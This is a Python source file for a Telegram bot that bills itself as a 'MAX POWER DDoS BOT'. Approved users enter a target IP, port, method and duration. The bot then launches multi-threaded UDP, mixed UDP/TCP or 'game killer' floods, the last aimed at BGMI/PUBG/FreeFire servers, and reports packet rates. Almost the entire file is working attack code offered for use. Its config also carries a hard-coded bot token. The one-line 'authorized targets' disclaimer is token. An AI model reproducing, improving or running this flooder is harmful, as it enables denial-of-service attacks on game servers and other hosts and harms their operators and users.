# bot_railway_fixed.py - Complete Working Version
import asyncio
import threading
import time
import random
import socket
import re
import os
import json
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# ============ CONFIG ============
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8576723884:AAFBd3WYuHVqTtFp-qvtRh3uFJoq_Q5zomQ")
ADMIN_IDS = [int(os.environ.get("ADMIN_ID", 8210011971))]
BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# ============ MAX POWER SETTINGS ============
class AttackConfig:
    def __init__(self):
        self.threads = 150           # MAX for Railway
        self.sockets_per_thread = 25  # Increased for more power
        self.delay = 0.000008        # Faster than before
        self.packet_size = 512

config = AttackConfig()

# Global state
attack_running = False
attack_stats = {'packets': 0, 'target': '', 'method': '', 'start': 0, 'duration': 0}
stats_lock = threading.Lock()
user_data = {}
active_attack_threads = []

# ============ DATABASE ============
USERS_FILE = "users.json"

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump(users, f)

def is_approved(uid):
    users = load_users()
    user = users.get(str(uid), {})
    if user.get('approved'):
        expires = user.get('expires')
        if expires and datetime.fromisoformat(expires) < datetime.now():
            return False
        return True
    return False

def approve_user(uid, days):
    users = load_users()
    users[str(uid)] = {
        'approved': True, 
        'expires': (datetime.now() + timedelta(days=days)).isoformat()
    }
    save_users(users)

# ============ POWERFUL ATTACK ENGINE ============
def udp_max_flood(ip, port):
    """Ultra high-speed UDP flood with multiple sockets"""
    global attack_running, attack_stats
    
    # Create multiple sockets per thread
    socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    
    payload = random._urandom(config.packet_size)
    
    while attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        time.sleep(config.delay)
    
    for sock in socks:
        sock.close()

def mixed_max_flood(ip, port):
    """UDP + TCP combined attack"""
    global attack_running, attack_stats
    
    udp_socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    
    payload = random._urandom(config.packet_size)
    
    while attack_running:
        # UDP burst
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        
        # TCP SYN
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.settimeout(0.0005)
            tcp.connect_ex((ip, port))
            tcp.close()
            with stats_lock:
                attack_stats['packets'] += 1
        except:
            pass
        
        time.sleep(config.delay)
    
    for sock in udp_socks:
        sock.close()

def game_killer_max(ip, port):
    """Specialized game server killer (BGMI/PUBG/FreeFire)"""
    global attack_running, attack_stats
    
    socks = []
    for _ in range(config.sockets_per_thread):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socks.append(s)
        except:
            pass
    
    # Special payloads for game servers
    payloads = [
        b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',
        b'\xfe\xfd\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',  # Game protocol malformed
        random._urandom(1024),
        b'\x00' * 1024,
        b'\xff' * 1024,
        b'\x01' * 1024,
        random._urandom(2048),
        random._urandom(512)
    ]
    
    while attack_running:
        for payload in payloads:
            for sock in socks:
                try:
                    sock.sendto(payload, (ip, port))
                    with stats_lock:
                        attack_stats['packets'] += 1
                except:
                    pass
        time.sleep(config.delay * 0.5)  # Even faster for game killer
    
    for sock in socks:
        sock.close()

# ============ ATTACK LAUNCHER ============
def start_attack(ip, port, duration, method, send_callback):
    global attack_running, attack_stats, active_attack_threads
    
    attack_running = True
    
    # Reset stats
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'target': f"{ip}:{port}",
            'method': method,
            'start': time.time(),
            'duration': duration
        }
    
    # Select attack function
    if method == 'udp':
        attack_func = udp_max_flood
    elif method == 'game':
        attack_func = game_killer_max
    else:
        attack_func = mixed_max_flood
    
    total_streams = config.threads * config.sockets_per_thread
    
    # Launch threads
    active_attack_threads = []
    for _ in range(config.threads):
        t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
        t.start()
        active_attack_threads.append(t)
    
    # Initial message with control buttons
    keyboard = [
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), 
         InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    
    send_callback(
        f"💀 *ATTACK STARTED* 💀\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"⚙️ Method: `{method.upper()}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🧵 Threads: `{config.threads}` × {config.sockets_per_thread} sockets = `{total_streams}` streams\n\n"
        f"_Sending packets..._",
        InlineKeyboardMarkup(keyboard)
    )
    
    # Monitor progress
    start_time = time.time()
    last_update = 0
    
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(0.8)
        
        if time.time() - last_update >= 1.5:
            last_update = time.time()
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            with stats_lock:
                pkt = attack_stats['packets']
            
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            
            msg = (
                f"💀 *MAX POWER ATTACK* 💀\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Streams: `{total_streams}`\n\n"
                f"🔘 *Use buttons below*"
            )
            
            keyboard = [
                [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), 
                 InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
            ]
            
            send_callback(msg, InlineKeyboardMarkup(keyboard))
    
    # Attack finished
    attack_running = False
    
    # Wait for threads to finish
    for t in active_attack_threads:
        t.join(timeout=0.5)
    
    with stats_lock:
        pkt = attack_stats['packets']
    
    avg_speed = int(pkt / duration) if duration else 0
    
    send_callback(
        f"✅ *ATTACK COMPLETED* ✅\n\n"
        f"🎯 `{ip}:{port}`\n"
        f"📦 Total Packets: `{pkt:,}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"💥 Average Speed: `{avg_speed:,}` pps\n\n"
        f"_Attack finished successfully_",
        None
    )

# ============ TELEGRAM HANDLERS ============
async def start_cmd(update, context):
    uid = update.effective_user.id
    
    # Auto-approve admin
    if uid in ADMIN_IDS and not is_approved(uid):
        approve_user(uid, 365)
    
    if not is_approved(uid) and uid not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ *Access Denied*\n\nContact administrator for approval.",
            parse_mode='Markdown'
        )
        return
    
    total_streams = config.threads * config.sockets_per_thread
    expected_speed = int((1 / config.delay) * config.threads * config.sockets_per_thread) if config.delay > 0 else 0
    
    keyboard = [
        [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
        [InlineKeyboardButton("📖 HELP", callback_data="help")]
    ]
    
    await update.message.reply_text(
        f"🔥 *MAX POWER DDoS BOT* 🔥\n\n"
        f"⚡ *Current Configuration:*\n"
        f"├ Threads: `{config.threads}`\n"
        f"├ Sockets/Thread: `{config.sockets_per_thread}`\n"
        f"├ Total Streams: `{total_streams}`\n"
        f"├ Delay: `{config.delay}` seconds\n"
        f"└ Packet Size: `{config.packet_size}` bytes\n\n"
        f"💥 *Expected Speed:* `{expected_speed:,}` pps\n\n"
        f"👇 *Click START to begin* 👇",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data == "start_attack":
        user_data[uid] = {'step': 'ip'}
        await query.edit_message_text(
            "🎯 *TARGET IP*\n\n"
            "Send target IP address:\n"
            "Example: `20.204.148.249`\n\n"
            "💡 For BGMI/PUBG, use the server IP from PCAPdroid",
            parse_mode='Markdown'
        )
    
    elif data == "settings":
        total_streams = config.threads * config.sockets_per_thread
        keyboard = [
            [InlineKeyboardButton("⬆️ +10 THREADS", callback_data="inc_threads")],
            [InlineKeyboardButton("⬇️ -10 THREADS", callback_data="dec_threads")],
            [InlineKeyboardButton("🚀 MAX SPEED", callback_data="max_speed")],
            [InlineKeyboardButton("🔙 BACK", callback_data="back_main")]
        ]
        await query.edit_message_text(
            f"⚙️ *SETTINGS*\n\n"
            f"📊 Threads: `{config.threads}` / 150\n"
            f"🔌 Sockets/Thread: `{config.sockets_per_thread}`\n"
            f"📡 Total Streams: `{total_streams}`\n"
            f"⏱️ Delay: `{config.delay}` sec\n"
            f"📦 Packet Size: `{config.packet_size}` bytes\n\n"
            f"*Adjust settings:*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == "inc_threads":
        if config.threads + 10 <= 150:
            config.threads += 10
            await query.edit_message_text(f"✅ Threads increased to `{config.threads}`", parse_mode='Markdown')
        else:
            await query.answer("⚠️ Max 150 threads on Railway!", show_alert=True)
    
    elif data == "dec_threads":
        if config.threads - 10 >= 50:
            config.threads -= 10
            await query.edit_message_text(f"✅ Threads decreased to `{config.threads}`", parse_mode='Markdown')
        else:
            await query.answer("⚠️ Minimum 50 threads!", show_alert=True)
    
    elif data == "max_speed":
        config.delay = 0.000005
        config.sockets_per_thread = 30
        await query.edit_message_text(
            f"✅ *MAX SPEED CONFIGURED*\n\n"
            f"Delay: `{config.delay}` sec\n"
            f"Sockets/Thread: `{config.sockets_per_thread}`\n"
            f"Use /start to see new expected speed",
            parse_mode='Markdown'
        )
    
    elif data == "back_main":
        total_streams = config.threads * config.sockets_per_thread
        expected_speed = int((1 / config.delay) * config.threads * config.sockets_per_thread)
        keyboard = [
            [InlineKeyboardButton("🚀 START ATTACK", callback_data="start_attack")],
            [InlineKeyboardButton("⚙️ SETTINGS", callback_data="settings")],
            [InlineKeyboardButton("📖 HELP", callback_data="help")]
        ]
        await query.edit_message_text(
            f"🔥 *MAX POWER DDoS BOT* 🔥\n\n"
            f"⚡ *Current Configuration:*\n"
            f"├ Threads: `{config.threads}`\n"
            f"├ Sockets/Thread: `{config.sockets_per_thread}`\n"
            f"├ Total Streams: `{total_streams}`\n"
            f"├ Delay: `{config.delay}` seconds\n"
            f"└ Packet Size: `{config.packet_size}` bytes\n\n"
            f"💥 *Expected Speed:* `{expected_speed:,}` pps\n\n"
            f"👇 *Click START to begin* 👇",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == "help":
        keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back_main")]]
        await query.edit_message_text(
            f"📖 *HELP & INFORMATION*\n\n"
            f"*How to use:*\n"
            f"1️⃣ Click START ATTACK\n"
            f"2️⃣ Enter target IP\n"
            f"3️⃣ Enter port number\n"
            f"4️⃣ Select attack method\n"
            f"5️⃣ Set duration (5-300s)\n"
            f"6️⃣ Confirm and attack starts\n\n"
            f"*Attack Methods:*\n"
            f"🔹 UDP MAX - Pure UDP flood (best for games)\n"
            f"🔹 MIXED MAX - UDP + TCP combined\n"
            f"🔹 GAME KILLER - Special for BGMI/PUBG\n\n"
            f"*During Attack:*\n"
            f"• STOP - Immediately halt attack\n"
            f"• INFO - View current stats\n"
            f"• REFRESH - Update progress\n\n"
            f"⚠️ *Use only on authorized targets!*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
    
    elif data == "stop_attack":
        global attack_running
        attack_running = False
        await query.edit_message_text("🛑 *Attack stopped by user*", parse_mode='Markdown')
    
    elif data == "info_attack":
        if attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
            
            await query.edit_message_text(
                f"ℹ️ *ATTACK INFORMATION*\n\n"
                f"🎯 Target: `{attack_stats['target']}`\n"
                f"⚙️ Method: `{attack_stats['method'].upper()}`\n"
                f"📦 Packets Sent: `{pkt:,}`\n"
                f"⏱️ Time Remaining: `{remaining}s`\n"
                f"💥 Current Speed: `{speed:,}` pps\n"
                f"📊 Status: `ACTIVE`",
                parse_mode='Markdown'
            )
        else:
            await query.answer("⚠️ No active attack running!", show_alert=True)
    
    elif data == "refresh_attack":
        if attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                progress = int((elapsed / attack_stats['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
            
            keyboard = [
                [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), 
                 InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
            ]
            
            await query.edit_message_text(
                f"💀 *ATTACK IN PROGRESS* 💀\n\n"
                f"🎯 `{attack_stats['target']}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"⏱️ Time: `{elapsed}/{attack_stats['duration']}s`\n"
                f"📊 `[{bar}]`\n\n"
                f"🔘 *Control buttons:*",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        else:
            await query.edit_message_text("✅ *No active attack*", parse_mode='Markdown')

async def handle_message(update, context):
    uid = update.effective_user.id
    
    if not is_approved(uid) and uid not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    step_data = user_data.get(uid, {})
    step = step_data.get('step')
    text = update.message.text.strip()
    
    if step == 'ip':
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', text):
            await update.message.reply_text("❌ *Invalid IP address*\nSend again:", parse_mode='Markdown')
            return
        step_data['ip'] = text
        step_data['step'] = 'port'
        user_data[uid] = step_data
        await update.message.reply_text(
            f"🔌 *PORT NUMBER*\n\n"
            f"Send port (1-65535):\n"
            f"Example: `8080` (BGMI), `80` (HTTP)\n\n"
            f"🚫 Blocked ports: `{', '.join(map(str, sorted(BLOCKED_PORTS)))}`",
            parse_mode='Markdown'
        )
    
    elif step == 'port':
        try:
            port = int(text)
            if port < 1 or port > 65535 or port in BLOCKED_PORTS:
                raise ValueError
            step_data['port'] = port
            step_data['step'] = 'method'
            user_data[uid] = step_data
            
            keyboard = [
                [InlineKeyboardButton("🔥 UDP MAX", callback_data="method_udp")],
                [InlineKeyboardButton("⚡ MIXED MAX", callback_data="method_mixed")],
                [InlineKeyboardButton("🎮 GAME KILLER", callback_data="method_game")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
            ]
            await update.message.reply_text(
                "⚔️ *SELECT ATTACK METHOD*\n\n"
                "Choose your weapon:",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ *Invalid port*\nSend again:", parse_mode='Markdown')
    
    elif step == 'duration':
        try:
            duration = int(text)
            if duration < 5 or duration > 300:
                raise ValueError
            
            ip = step_data['ip']
            port = step_data['port']
            method = step_data.get('method', 'mixed')
            del user_data[uid]
            
            keyboard = [
                [InlineKeyboardButton("💀 CONFIRM ATTACK", callback_data=f"start_{ip}_{port}_{duration}_{method}")],
                [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]
            ]
            
            total_streams = config.threads * config.sockets_per_thread
            
            await update.message.reply_text(
                f"💀 *CONFIRM ATTACK* 💀\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"🧵 Threads: `{config.threads}`\n"
                f"📡 Total Streams: `{total_streams}`\n\n"
                f"⚠️ *This will flood the target!*\n"
                f"💀 *Confirm to start* 💀",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except:
            await update.message.reply_text("❌ *Invalid duration*\nSend number (5-300):", parse_mode='Markdown')

async def method_callback(update, context):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await query.edit_message_text("❌ *Operation cancelled*", parse_mode='Markdown')
        return
    
    if data.startswith("method_"):
        method = data.split("_")[1]
        if uid not in user_data:
            user_data[uid] = {}
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await query.edit_message_text(
            f"✅ *Method selected: `{method.upper()}`*\n\n"
            f"⏱️ Send attack duration (5-300 seconds):",
            parse_mode='Markdown'
        )
        return
    
    if data.startswith("start_"):
        parts = data.split("_")
        if len(parts) != 5:
            await query.edit_message_text("❌ Invalid attack parameters", parse_mode='Markdown')
            return
        
        ip = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        method = parts[4]
        
        if uid in user_data:
            del user_data[uid]
        
        await query.edit_message_text(
            f"🚀 *Launching {method.upper()} attack*\n\n"
            f"🎯 Target: `{ip}:{port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"🧵 Threads: `{config.threads}`\n\n"
            f"_Initializing attack engine..._",
            parse_mode='Markdown'
        )
        
        # Create callback for attack updates
        loop = asyncio.get_event_loop()
        
        def send_callback(msg_text, reply_markup=None):
            """Synchronous callback for attack thread"""
            if reply_markup:
                coro = query.message.reply_text(msg_text, parse_mode='Markdown', reply_markup=reply_markup)
            else:
                coro = query.message.reply_text(msg_text, parse_mode='Markdown')
            asyncio.run_coroutine_threadsafe(coro, loop)
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=start_attack,
            args=(ip, port, duration, method, send_callback),
            daemon=True
        )
        attack_thread.start()

async def stop_cmd(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 *Attack stopped by command*", parse_mode='Markdown')

async def admin_approve(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("❌ *Admin access required*", parse_mode='Markdown')
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "📖 *Usage:* `/approve <user_id> <days>`\n"
            "Example: `/approve 8210011971 30`",
            parse_mode='Markdown'
        )
        return
    
    try:
        target_uid = int(context.args[0])
        days = int(context.args[1])
        approve_user(target_uid, days)
        await update.message.reply_text(
            f"✅ *User `{target_uid}` approved for `{days}` days*",
            parse_mode='Markdown'
        )
    except:
        await update.message.reply_text("❌ *Invalid parameters*", parse_mode='Markdown')

# ============ MAIN ============
def main():
    total_streams = config.threads * config.sockets_per_thread
    expected_speed = int((1 / config.delay) * config.threads * config.sockets_per_thread) if config.delay > 0 else 0
    
    print("=" * 70)
    print("🔥 MAX POWER DDoS BOT - RAILWAY DEPLOYMENT")
    print("=" * 70)
    print(f"👑 Admin IDs: {ADMIN_IDS}")
    print(f"🧵 Attack Threads: {config.threads}")
    print(f"🔌 Sockets per Thread: {config.sockets_per_thread}")
    print(f"📡 Total Concurrent Streams: {total_streams}")
    print(f"⚡ Delay: {config.delay} seconds")
    print(f"💥 Expected Packet Rate: {expected_speed:,} pps")
    print("=" * 70)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("approve", admin_approve))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(button_callback, pattern="^(start_attack|settings|help|back_main|inc_threads|dec_threads|max_speed|stop_attack|info_attack|refresh_attack)$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^(method_|start_|cancel)"))
    
    # Message handler
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ BOT IS LIVE! Send /start on Telegram")
    print("=" * 70)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
